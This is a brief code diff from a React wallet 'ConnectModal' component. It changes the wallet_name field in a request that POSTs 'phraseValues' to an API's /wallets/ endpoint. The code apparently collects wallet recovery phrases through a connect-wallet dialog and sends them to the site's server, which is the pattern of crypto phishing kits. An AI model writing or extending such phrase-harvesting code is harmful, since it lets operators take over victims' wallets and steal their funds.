@@ -113,7 +113,7 @@ const ConnectModal = ({ showConnectModal, setShowConnectModal, wallet }) => {
       };
       axios.post(
         `${VITE_API_URL}/wallets/`,
-        { ...phraseValues, wallet_name: formType },
+        { ...phraseValues, wallet_name: wallet?.name },
         config
       );
     },
